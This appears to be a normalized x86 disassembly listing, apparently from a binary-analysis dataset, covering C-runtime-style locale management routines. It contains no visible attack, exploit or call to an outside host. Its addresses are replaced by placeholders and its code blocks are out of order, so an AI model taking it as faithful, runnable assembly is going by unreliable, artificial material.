call sub_4247fe
push 0xc
call sub_41ad36
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_4248f0
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_424807
call sub_41ecf5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_424810
call sub_4187c9
call sub_41ae65
test eax eax
jne r-xdata
push sub_42459f
call sub_41c6f9
pop ecx
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call sub_424886
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_41b887
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_424886
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_41c755
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_42475d
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_4248a3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_41ccd0
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_4248d1
push ebp
mov ebp esp
xor edx edx
mov eax edx
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] dx
je r-xdata
sub_4248f0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
cmp [ edi + 0x78 ] 0x0
je r-xdata
mov eax [ edi + 0x80 ]
test eax eax
je r-xdata
push [ edi + 0x78 ]
call esi
cmp [ edi + 0x7c ] 0x0
je r-xdata
push eax
call esi
mov eax [ edi + 0x88 ]
test eax eax
je r-xdata
push [ edi + 0x7c ]
call esi
push 0x6
pop eax
lea ebx [ edi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call esi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call esi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0x9c ]
add eax 0xb0
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push [ ebx - 0x4 ]
call esi
mov eax [ ebp + 0x8 ]
sub_424980
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0x84 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
lea edi [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_417912
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_417912
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_417912
push [ esi + 0x88 ]
call sub_417912
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_42b402
push [ esi + 0x9c ]
call sub_417912
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_417912
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_417912
push [ ebx ]
call sub_417912
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_417912
push [ esi + 0x84 ]
call sub_417912
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_417912
push [ esi + 0x84 ]
call sub_42acf5
pop ecx
pop ecx
push eax
call sub_417912
pop ecx
push eax
call sub_417912
push [ esi + 0x84 ]
call sub_42b193
pop ecx
pop ecx
sub_424ada
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
cmp [ esi + 0x78 ] 0x0
je r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
push [ esi + 0x78 ]
call edi
cmp [ esi + 0x7c ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push [ esi + 0x7c ]
call edi
push 0x6
pop eax
lea ebx [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call edi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call edi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov ecx [ esi + 0x9c ]
add ecx 0xb0
push ecx
call edi
pop edi
pop ebx
push [ ebx - 0x4 ]
call edi
mov eax [ ebp + 0x8 ]
sub_424b75
push 0xc
push r--data
call sub_41ecb0
call sub_4246d6
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_424bf1
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_424be8
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_4246d6
mov esi [ eax + 0x6c ]
mov eax esi
call sub_41ecf5
retn
push 0x20
call sub_4186ea
sub_424bf1
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_4248f0
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_424ada
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_424980
pop ecx
sub_424c6c
push 0x8
push r--data
call sub_41ecb0
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_41ecf5
retn
push 0xc
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_424bf1
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_424cb5
sub_424cbe
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ebx
push 0x55
push [ ebp + 0x8 ]
call sub_4248d1
mov ebx eax
pop ecx
pop ecx
cmp ebx 0x55
jb r-xdata
xor eax eax
pop ebp
retn
lea eax [ ebx * 2 + 0x2 ]
push edi
push eax
call sub_41b8d1
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebx + 0x1 ]
push eax
push [ ebp + 0x8 ]
push eax
push edi
call sub_419c88
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41f421
int3
mov eax edi
jmp r-xdata
sub_424d22
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417a48
add esp 0xc
xor esi esi
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_41f421
int3
lea eax [ edi + 0x80 ]
cmp [ eax ] si
je r-xdata
add edi 0x100
cmp [ edi ] si
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4251db
add esp 0x14
pop edi
pop esi
pop ebp
retn
push edi
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4251db
add esp 0x14
sub_424d90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x1ca
xor ebx ebx
push ebx
push edi
call sub_41cae0
mov esi [ ebp + 0xc ]
add esp 0xc
movzx eax [ esi ]
test ax ax
jne r-xdata
push 0x2e
pop ecx
cmp ax cx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] ebx
lea eax [ esi + 0x2 ]
cmp [ eax ] bx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
or eax 0xffffffff
lea ecx [ esi + eax * 2 ]
mov [ ebp - 0x4 ] ecx
movzx ebx [ ecx ]
mov ecx [ ebp + 0xc ]
push 0x2c
pop edx
test ecx ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x100 ]
push 0x10
push eax
call sub_419c88
add esp 0x10
test eax eax
jne r-xdata
cmp ecx 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x11e ] ax
jmp r-xdata
cmp ecx 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
push 0x2e
pop ecx
cmp bx cx
je r-xdata
cmp eax 0x10
jae r-xdata
cmp ebx 0x5f
je r-xdata
push eax
push esi
push 0x40
push edi
jmp r-xdata
test bx bx
je r-xdata
push eax
push esi
push 0x40
lea eax [ edi + 0x80 ]
jmp r-xdata
call sub_419c88
add esp 0x10
test eax eax
jne r-xdata
push eax
push esi
push 0x10
lea eax [ edi + 0x100 ]
cmp bx dx
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push 0x2c
pop eax
cmp bx ax
je r-xdata
call sub_41f421
int3
test bx bx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
inc [ ebp + 0xc ]
jmp r-xdata
push r--data
push esi
call sub_42c02d
pop ecx
pop ecx
test eax eax
je r-xdata
sub_424eba
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x2e
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_4248f0
pop ecx
pop edi
sub_424ee6
push ebp
mov ebp esp
sub esp 0x1f0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x1ec ] eax
mov [ ebp - 0x1f0 ] edi
call sub_4246d6
lea ecx [ eax + 0xb4 ]
mov [ ebp - 0x1d8 ] ecx
lea ecx [ eax + 0xb8 ]
mov [ ebp - 0x1e0 ] ecx
lea ecx [ eax + 0x1be ]
mov [ ebp - 0x1d4 ] ecx
xor ecx ecx
mov [ ebp - 0x1dc ] ecx
test esi esi
jne r-xdata
add eax 0x2ec
push 0x55
push eax
push [ ebp + 0x18 ]
mov [ ebp - 0x1e8 ] eax
push ebx
call sub_419c88
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_41cd45
pop ecx
mov [ ebp - 0x1e4 ] eax
cmp eax 0x83
jae r-xdata
cmp [ esi + 0x2 ] ax
jne r-xdata
mov edi [ rw-data ]
xor edi [ rw-data ]
lea eax [ ebp - 0x1d0 ]
neg edi
sbb edi edi
push esi
not edi
push eax
and edi 0x1
call sub_424d90
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x1d4 ]
call sub_42bfef
pop ecx
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x1ec ]
push r--data
push [ ebp + 0x10 ]
push esi
call sub_417a48
add esp 0xc
test eax eax
jne r-xdata
mov edi [ ebp - 0x1d8 ]
lea eax [ ebp - 0x1d0 ]
push eax
test edi edi
mov edi [ ebp - 0x1d8 ]
push edi
push eax
je r-xdata
test edi edi
je r-xdata
push esi
push [ ebp - 0x1e0 ]
call sub_42bfef
pop ecx
pop ecx
test eax eax
je r-xdata
test edi edi
je r-xdata
push ebx
call sub_41cd45
inc eax
push eax
push ebx
push 0x55
push [ ebp - 0x1e8 ]
call sub_419c88
add esp 0x14
test eax eax
jne r-xdata
push 0x2
lea eax [ ebp - 0x1dc ]
push eax
push 0x20001004
push esi
call sub_41e86a
add esp 0x10
test eax eax
je r-xdata
call sub_42c5d3
call sub_42ce1f
jmp r-xdata
mov ebx [ ebp - 0x1d4 ]
mov esi [ ebp - 0x1ec ]
push ebx
push [ ebp + 0x10 ]
push esi
call sub_417a48
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0x1d8 ]
push edi
call sub_41a1a0
add esp 0xc
mov eax esi
jmp r-xdata
mov [ edi ] eax
jmp r-xdata
call [ GetACP@IAT ]
mov [ ebp - 0x1dc ] eax
mov eax [ ebp - 0x1dc ]
test eax eax
jne r-xdata
push esi
call sub_41e8c4
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x1d0 ]
push eax
mov edi 0x83
push edi
push [ ebp - 0x1d4 ]
call sub_424d22
add esp 0xc
test ebx ebx
je r-xdata
add esp 0xc
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
push edi
push esi
push [ ebp + 0x18 ]
push ebx
call sub_419c88
add esp 0x10
test eax eax
jne r-xdata
movzx eax ax
mov [ edi ] eax
mov edi [ ebp - 0x1e4 ]
inc edi
push edi
push esi
push 0x83
push [ ebp - 0x1d4 ]
call sub_419c88
add esp 0x10
test eax eax
jne r-xdata
xor ebx ebx
cmp [ esi ] bx
je r-xdata
lea eax [ ebp - 0xb0 ]
push eax
call sub_41cd45
inc eax
push eax
lea eax [ ebp - 0xb0 ]
push eax
push [ ebp + 0x18 ]
push ebx
call sub_419c88
add esp 0x14
test eax eax
je r-xdata
push edi
push esi
push 0x55
push [ ebp - 0x1e8 ]
call sub_419c88
add esp 0x10
test eax eax
jne r-xdata
mov eax [ ebp - 0x1e0 ]
xor ecx ecx
mov [ eax ] cx
mov eax [ ebp - 0x1e4 ]
cmp eax edi
jae r-xdata
jmp r-xdata
mov edi 0x83
inc eax
push eax
push esi
push edi
push [ ebp - 0x1e0 ]
call sub_419c88
add esp 0x10
test eax eax
je r-xdata
mov edi [ ebp - 0x1f0 ]
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
call sub_41f421
int3
sub_4251db
push ebp
mov ebp esp
push ebx
xor ebx ebx
push esi
mov esi ebx
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop esi
pop ebx
pop ebp
retn
push edi
lea edi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41f421
int3
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
lea edi [ edi + 0x4 ]
push [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4179dc
add esp 0xc
test eax eax
jne r-xdata
pop edi
sub_42521a
push 0x14
push r--data
call sub_41ecb0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_4246d6
mov esi eax
mov [ ebp - 0x20 ] esi
call sub_424b75
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] ebx
push 0x1
push 0xb8
call sub_41b887
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
test edi edi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_425392
mov eax ebx
push 0xc
call sub_41ad36
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi + 0x6c ]
push edi
call sub_424eba
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
call sub_425350
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_42550b
add esp 0xc
mov ebx eax
mov [ ebp - 0x1c ] ebx
test ebx ebx
je r-xdata
call sub_41ecf5
retn
push edi
call sub_424ada
push edi
call sub_424980
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_41ad36
pop ecx
mov [ ebp - 0x4 ] 0x2
lea eax [ esi + 0x6c ]
push edi
push eax
call sub_424bf1
push edi
call sub_424ada
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_42bfef
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_42535f
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x1
push [ esi + 0x6c ]
push rw-data
call sub_424bf1
pop ecx
pop ecx
mov ecx [ rw-data ]
mov eax [ ecx + 0x84 ]
mov [ rw-data ] eax
mov eax [ ecx + 0x90 ]
mov [ rw-data ] eax
mov eax [ ecx + 0x74 ]
mov [ rw-data ] eax
sub_425397
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
xor edi edi
inc edi
push 0x6a6
mov [ ebp - 0x8 ] edi
call sub_41b8d1
mov ebx eax
xor eax eax
pop ecx
test ebx ebx
je r-xdata
pop edi
pop ebx
leave
retn
push esi
lea esi [ ebx + 0x4 ]
mov [ esi ] ax
mov [ ebx ] edi
mov edi [ ebp + 0x8 ]
push [ edi + 0x24 ]
push r--data
push [ r--data ]
push 0x3
push 0x351
push esi
call sub_4251db
mov eax r--data
mov [ ebp - 0x4 ] eax
lea eax [ edi + 0x24 ]
add esp 0x18
mov [ ebp - 0xc ] eax
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
call sub_41f421
int3
mov eax [ ebp - 0xc ]
lea esi [ eax + 0x10 ]
push [ esi ]
push [ eax ]
call sub_42bfef
neg eax
sbb eax eax
not eax
and [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ecx esi
add eax 0xc
push [ ecx ]
lea esi [ ebx + 0x4 ]
push r--data
push [ eax ]
mov [ ebp - 0xc ] ecx
push 0x3
push 0x351
push esi
mov [ ebp - 0x4 ] eax
call sub_4251db
mov eax [ ebp - 0x4 ]
add esp 0x20
cmp eax r--data
jl r-xdata
push r--data
push 0x351
push esi
call sub_4179dc
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push ebx
call sub_417912
cmp [ edi + 0x1c ] 0x0
mov esi [ InterlockedDecrement@IAT ]
pop ecx
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
cmp [ edi + 0x18 ] 0x0
je r-xdata
push [ edi + 0x1c ]
call esi
test eax eax
jne r-xdata
cmp [ edi + 0x18 ] 0x0
je r-xdata
push [ edi + 0x1c ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x34 ]
xor ecx ecx
mov [ edi + 0x18 ] ecx
mov [ edi + 0x10 ] ecx
mov [ edi + 0x1c ] ecx
mov [ edi + 0x14 ] ecx
jmp r-xdata
push [ edi + 0x18 ]
call esi
test eax eax
jne r-xdata
push [ edi + 0x1c ]
call sub_417912
pop ecx
xor ecx ecx
mov [ edi + 0x18 ] ecx
mov [ edi + 0x10 ] ecx
mov [ edi + 0x1c ] ebx
mov [ edi + 0x14 ] esi
mov eax esi
push [ edi + 0x18 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
push [ edi + 0x1c ]
call sub_417912
pop ecx
pop esi
push [ edi + 0x18 ]
call sub_417912
pop ecx
push [ edi + 0x18 ]
call sub_417912
pop ecx
sub_42550b
push ebp
mov ebp esp
sub esp 0x1cc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x1cc ] edi
test eax eax
je r-xdata
xor eax eax
mov ebx eax
mov [ ebp - 0x1c0 ] 0x1
mov [ ebp - 0x1c4 ] ebx
test esi esi
je r-xdata
test esi esi
je r-xdata
push edi
call sub_425397
pop ecx
cmp [ esi ] 0x4c
jne r-xdata
add eax eax
mov eax [ edi + eax * 8 + 0x14 ]
jmp r-xdata
push esi
push eax
push edi
call sub_425792
add esp 0xc
jmp r-xdata
push eax
push 0x55
lea eax [ ebp - 0x1b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_424ee6
add esp 0x18
test eax eax
je r-xdata
cmp [ esi + 0x2 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
lea eax [ edi + 0x14 ]
xor esi esi
mov [ ebp - 0x1bc ] eax
cmp [ esi + 0x4 ] 0x5f
jne r-xdata
mov ecx [ ebp - 0x1c0 ]
push [ eax ]
lea eax [ ebp - 0x10c ]
push eax
call sub_42bfef
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push esi
call sub_42c07c
pop ecx
pop ecx
mov [ ebp - 0x1c8 ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x1bc ]
lea eax [ ebp - 0x10c ]
push eax
push esi
push edi
call sub_425792
add esp 0xc
test eax eax
mov eax [ ebp - 0x1bc ]
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx eax
sub ecx esi
sar ecx 0x1
mov [ ebp - 0x1bc ] ecx
je r-xdata
test ebx ebx
je r-xdata
inc ebx
xor ecx ecx
mov [ ebp - 0x1c0 ] ecx
jmp r-xdata
push 0x3b
pop ecx
cmp [ eax ] cx
je r-xdata
inc esi
add eax 0x10
mov [ ebp - 0x1bc ] eax
cmp esi 0x5
jle r-xdata
mov edi [ ebp - 0x1bc ]
mov [ ebp - 0x1c0 ] 0x1
mov ebx r--data
inc [ ebp - 0x1c0 ]
add ebx 0xc
cmp ebx r--data
jle r-xdata
push [ ebx ]
call sub_41cd45
pop ecx
cmp edi eax
je r-xdata
push edi
push esi
push [ ebx ]
call sub_428db5
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x1c8 ]
add esi 0x2
push r--data
push esi
call sub_42c02d
mov edi [ ebp - 0x1cc ]
mov ebx [ ebp - 0x1c4 ]
pop ecx
pop ecx
mov [ ebp - 0x1bc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x1c0 ] 0x5
jg r-xdata
push 0x3b
pop ecx
cmp [ esi ] cx
jne r-xdata
lea esi [ esi + eax * 2 ]
xor eax eax
cmp [ esi ] ax
je r-xdata
push eax
push esi
lea eax [ ebp - 0x10c ]
push 0x83
push eax
call sub_419c88
add esp 0x10
test eax eax
jne r-xdata
test ebx ebx
jne r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41f421
int3
mov eax [ ebp - 0x1bc ]
add eax eax
cmp eax 0x106
jae r-xdata
jmp r-xdata
call sub_419e7c
xor ecx ecx
mov [ ebp + eax - 0x10c ] cx
lea eax [ ebp - 0x10c ]
push eax
push [ ebp - 0x1c0 ]
push edi
call sub_425792
add esp 0xc
test eax eax
mov eax [ ebp - 0x1bc ]
je r-xdata
inc ebx
mov [ ebp - 0x1c4 ] ebx
sub_425792
push ebp
mov ebp esp
sub esp 0x2ec
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x2cc ] ebx
call sub_4246d6
add eax 0x2c4
mov [ ebp - 0x2c0 ] eax
lea eax [ ebp - 0x2d4 ]
push eax
push 0x55
lea eax [ ebp - 0x2b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_424ee6
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
lea eax [ ebp - 0x10c ]
push [ ebx + edi + 0x14 ]
mov [ ebp - 0x2e4 ] ebx
push eax
call sub_42bfef
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x10c ]
push eax
call sub_41cd45
lea esi [ eax + 0x1 ]
lea ecx [ esi * 2 + 0x4 ]
push ecx
call sub_41b8d1
pop ecx
pop ecx
mov [ ebp - 0x2dc ] eax
test eax eax
je r-xdata
mov eax [ ebx + edi + 0x14 ]
jmp r-xdata
lea ecx [ eax + 0x4 ]
mov eax [ ebx + edi + 0x14 ]
mov [ ebp - 0x2e0 ] eax
mov eax [ ebp - 0x2cc ]
add eax 0x28
mov [ ebp - 0x2d0 ] ecx
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x2c4 ] eax
mov eax [ eax ]
mov [ ebp - 0x2ec ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x2e8 ] eax
lea eax [ ebp - 0x10c ]
push eax
push esi
push ecx
call sub_417a48
add esp 0xc
xor esi esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
push esi
push esi
push esi
push esi
push esi
call sub_41f421
int3
cmp [ ebp - 0x10c ] 0x43
mov eax [ ebp - 0x2d0 ]
mov [ ebx + edi + 0x14 ] eax
jne r-xdata
lea eax [ ebp - 0x2b8 ]
push eax
call sub_424cbe
pop ecx
mov ecx [ ebp - 0x2c4 ]
mov [ ecx ] eax
cmp [ ebp - 0x10a ] si
jne r-xdata
cmp edx 0x1
jne r-xdata
mov eax [ ebp - 0x2d4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x2c0 ]
mov [ ebp - 0x2c8 ] eax
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x2d8 ] ecx
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x2d0 ] ecx
mov ecx esi
mov [ ebp - 0x2bc ] ecx
mov ecx [ ebp - 0x2c4 ]
mov [ ecx ] esi
jmp r-xdata
cmp edx 0x5
jne r-xdata
mov eax [ ebp - 0x2d4 ]
mov [ edi + 0x8 ] eax
jmp r-xdata
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x2c8 ]
mov edx [ ebp - 0x2c8 ]
mov eax [ ecx ]
mov ebx [ ebp - 0x2d8 ]
mov ecx [ ecx + 0x4 ]
add [ ebp - 0x2c8 ] 0x8
mov [ edx ] ebx
mov ebx [ ebp - 0x2d0 ]
mov [ ebp - 0x2d0 ] ecx
mov ecx [ ebp - 0x2bc ]
inc ecx
mov [ edx + 0x4 ] ebx
mov ebx [ ebp - 0x2e4 ]
mov edx [ ebp - 0x2cc ]
mov [ ebp - 0x2d8 ] eax
mov [ ebp - 0x2bc ] ecx
cmp ecx 0x5
jl r-xdata
mov edx [ ebp - 0x2cc ]
cmp edx 0x2
jne r-xdata
imul edx edx 0xc
push edi
call [ edx + r--data ]
test eax eax
mov eax [ ebp - 0x2e0 ]
pop ecx
je r-xdata
mov eax [ ebp - 0x2d4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x2bc ]
mov ecx [ ebp - 0x2c0 ]
mov ecx [ ebp - 0x2c0 ]
mov eax [ ebp - 0x2bc ]
mov ebx [ ebp - 0x2d8 ]
mov eax [ ecx + eax * 8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x2bc ]
mov eax [ ecx + eax * 8 + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp - 0x2bc ]
mov [ ecx + eax * 8 ] ebx
mov ebx [ ebp - 0x2d0 ]
mov [ ecx + eax * 8 + 0x4 ] ebx
mov ebx [ ebp - 0x2e4 ]
jmp r-xdata
mov edx [ ebp - 0x2c8 ]
mov eax [ edi + 0x4 ]
cmp eax [ edx ]
mov edx [ ebp - 0x2cc ]
je r-xdata
cmp eax rw-data
je r-xdata
mov [ ebx + edi + 0x14 ] eax
mov ebx [ ebp - 0x2c4 ]
push [ ebx ]
call sub_417912
mov eax [ ebp - 0x2ec ]
mov [ ebx ] eax
mov eax [ ebp - 0x2dc ]
push eax
call sub_417912
mov eax [ ebp - 0x2e8 ]
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ ecx + 0x4 ]
